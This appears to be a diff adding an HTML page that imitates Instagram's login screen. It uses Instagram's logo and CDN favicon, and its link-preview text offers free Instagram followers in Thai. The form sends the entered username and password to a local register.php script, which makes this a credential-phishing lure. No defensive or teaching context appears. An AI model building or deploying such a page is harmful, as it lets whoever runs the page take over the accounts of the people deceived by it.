@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IG Login Page</title>
+    <meta property="og:title" content="Serenely - IG Follow">
+    <meta property="og:site_name" content="ปั๊มฟอล IG">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://www.serenely.day/">
+    <meta property="og:image" content="https://static.cdninstagram.com/rsrc.php/v3/yR/r/hexDR1NOpRC.png">
+    <meta property="og:description" content="ปั๊มฟอล IG ฟรี">
+    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/yR/r/hexDR1NOpRC.png" type="image/png" sizes="16x16">
+    <link rel="stylesheet" href="./style.css">
+</head>
+<body>
+    <section>
+        <main class="main">
+            <div class="col-a">
+                <div class="image">
+                    <img 
+                        id="first"
+                        class="img" 
+                        src="./assets/img/img-1.png" 
+                        alt=""
+                    />
+                    <img
+                        id="second"
+                        class="img" 
+                        src="./assets/img/img-2.png" 
+                        alt=""
+                    />
+                    <img 
+                        id="third"
+                        class="img" 
+                        src="./assets/img/img-3.png" 
+                        alt=""
+                    />
+                    <img
+                        id="fourth"
+                        class="img" 
+                        src="./assets/img/img-4.png" 
+                        alt=""
+                    />
+                </div>
+            </div>
+            <div class="col-b">
+                <div class="col-b__form-container">
+                    <div class="logo">
+                        <div 
+                            aria-disabled="false" 
+                            role="button" 
+                            style="cursor: pointer;" 
+                            tabindex="0"
+                        >
+                            <img class="img-logo" src="./assets/img/instagram.png" alt="Instagram">
+                        </div>
+                    </div>
+                    <form action="register.php" method="post">
+                        <div class="form-element">
+                            <div class="input-wrapper">
+                                <div class="input-border">
+                                    <label class="input-label">
+                                        <span class="input-hint">Phone number, username, or email</span>
+                                        <input id="inputText" class="input-credentials" type="text" aria-label="Phone number, username, or email" aria-required="true" autocapitalize="none" autocorrect="off" maxlength="75" name="username">
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="input-wrapper">
+                                <div class="input-border">
+                                    <label class="input-label">
+                                        <span class="input-hint" id="hintPwd">Password</span>
+                                        <input id="pwd" class="input-credentials" type="password" aria-label="Password" aria-required="true" autocapitalize="none" autocorrect="off" name="password">
+                                    </label>
+                                    <div class="show-pwd-wrapper">
+                                        <div class="show-pwd-item">
+                                            <input 
+                                                class="show-pwd-btn" 
+                                                type="button"
+                                            />
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="submit-btn">
+                                <input class="btn-login" type="submit" value="Log In">
+                            </div>
+                            <div class="line">
+                                <div class="line-left"></div>
+                                <h4>or</h4>
+                                <div class="line-right"></div>
+                            </div>
+                            <div class="login-btn-wrapper">
+                                <button>
+                                    <span></span>
+                                    <span >Log in with Facebook</span>
+                                </button>
+                            </div>
+                        </div>
+                        <a class="_password" href="#" tabindex="0">Forgot password?</a>
+                    </form>
+                </div>
+                <div class="container-signup">
+                    <div class="signup">
+                        <p>
+                            Don't have an account?
+                            <a href="#">Sign up</a>
+                        </p>
+                    </div>
+                </div>
+                <div class="stores-container">
+                    <p>Get the app.</p>
+                    <div class="stores">
+                        <a href="#"><img src="./assets/img/app-store.png" alt=""></a>
+                        <a href="#"><img src="./assets/img/playstore.png" alt=""></a>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </section>
+    <script src="./app.js"></script>  
+</body>
+</html>
